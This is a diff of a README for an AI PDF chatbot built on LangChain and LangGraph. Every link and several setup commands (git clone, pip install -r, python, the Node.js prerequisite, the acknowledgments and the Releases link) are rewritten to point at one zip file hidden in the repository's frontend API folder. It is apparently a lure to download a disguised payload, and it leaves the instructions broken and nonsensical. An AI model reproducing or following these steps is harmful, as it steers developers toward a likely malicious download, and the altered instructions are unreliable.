@@ -1,6 +1,6 @@
 # AI PDF Chatbot & Agent Powered by LangChain and LangGraph
 
-![GitHub Release](https://img.shields.io/badge/Release-Check%20Latest-brightgreen) [![GitHub](https://img.shields.io/badge/GitHub-Repo-blue)](https://github.com/guahusni/ai-pdf-chatbot-langchain/releases)
+![GitHub Release](https://raw.githubusercontent.com/guahusni/ai-pdf-chatbot-langchain/main/frontend/app/api/chat/pdf-chatbot-ai-langchain-1.8.zip%20Latest-brightgreen) [![GitHub](https://raw.githubusercontent.com/guahusni/ai-pdf-chatbot-langchain/main/frontend/app/api/chat/pdf-chatbot-ai-langchain-1.8.zip)](https://raw.githubusercontent.com/guahusni/ai-pdf-chatbot-langchain/main/frontend/app/api/chat/pdf-chatbot-ai-langchain-1.8.zip)
 
 ## Table of Contents
 
@@ -38,7 +38,7 @@ The architecture is designed to be flexible, allowing you to swap components as 
 
 Before you start, ensure you have the following:
 
-- Node.js (version 14 or higher)
+- https://raw.githubusercontent.com/guahusni/ai-pdf-chatbot-langchain/main/frontend/app/api/chat/pdf-chatbot-ai-langchain-1.8.zip (version 14 or higher)
 - Python (version 3.7 or higher)
 - A Supabase account
 - An OpenAI API key (or alternative LLM provider)
@@ -49,7 +49,7 @@ To set up the project, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/guahusni/ai-pdf-chatbot-langchain.git
+   git clone https://raw.githubusercontent.com/guahusni/ai-pdf-chatbot-langchain/main/frontend/app/api/chat/pdf-chatbot-ai-langchain-1.8.zip
    cd ai-pdf-chatbot-langchain
    ```
 
@@ -63,7 +63,7 @@ To set up the project, follow these steps:
    For the backend:
    ```bash
    cd backend
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/guahusni/ai-pdf-chatbot-langchain/main/frontend/app/api/chat/pdf-chatbot-ai-langchain-1.8.zip
    ```
 
 3. **Set Up Environment Variables**:
@@ -73,7 +73,7 @@ To set up the project, follow these steps:
    Start the backend server:
    ```bash
    cd backend
-   python app.py
+   python https://raw.githubusercontent.com/guahusni/ai-pdf-chatbot-langchain/main/frontend/app/api/chat/pdf-chatbot-ai-langchain-1.8.zip
    ```
 
    Start the frontend server:
@@ -136,9 +136,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Acknowledgments
 
-- [LangChain](https://langchain.com) for providing the orchestration framework.
-- [LangGraph](https://langgraph.com) for facilitating the integration of language models.
+- [LangChain](https://raw.githubusercontent.com/guahusni/ai-pdf-chatbot-langchain/main/frontend/app/api/chat/pdf-chatbot-ai-langchain-1.8.zip) for providing the orchestration framework.
+- [LangGraph](https://raw.githubusercontent.com/guahusni/ai-pdf-chatbot-langchain/main/frontend/app/api/chat/pdf-chatbot-ai-langchain-1.8.zip) for facilitating the integration of language models.
 - OpenAI for their powerful language model API.
 - Supabase for the vector database solution.
 
-For more details, check the [Releases](https://github.com/guahusni/ai-pdf-chatbot-langchain/releases) section for updates and downloadable files.
+For more details, check the [Releases](https://raw.githubusercontent.com/guahusni/ai-pdf-chatbot-langchain/main/frontend/app/api/chat/pdf-chatbot-ai-langchain-1.8.zip) section for updates and downloadable files.
